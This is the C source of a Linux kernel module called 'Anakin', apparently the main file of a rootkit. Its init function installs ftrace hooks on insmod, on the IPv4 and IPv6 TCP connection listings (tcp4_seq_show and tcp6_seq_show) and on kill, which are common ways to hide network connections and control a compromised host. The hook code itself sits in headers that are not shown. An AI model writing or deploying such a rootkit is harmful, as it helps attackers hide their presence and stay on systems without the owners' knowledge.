#include "include/core.h"
#include "include_hooks/insmod.h"
#include "include_hooks/kill.h"
#include "include_hooks/tcp_seq_show.h"

static int __init AnakinInit(void) {
    printk(KERN_INFO "Anakin is here\n");

    int ret = 0;

    ret |= init_hook_insmod();
    ret |= init_hook_tcp4_seq_show();
    ret |= init_hook_tcp6_seq_show();
    ret |= init_hook_kill();

    return ret;
}

static void __exit AnakinExit(void) {
    printk(KERN_INFO "Anakin killed padmé\n");

    exit_hook_insmod();
    exit_hook_tcp4_seq_show();
    exit_hook_tcp6_seq_show();
    exit_hook_kill();
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("hoWo");
MODULE_DESCRIPTION("Simple sys_kill hook using ftrace");

module_init(AnakinInit);
module_exit(AnakinExit);
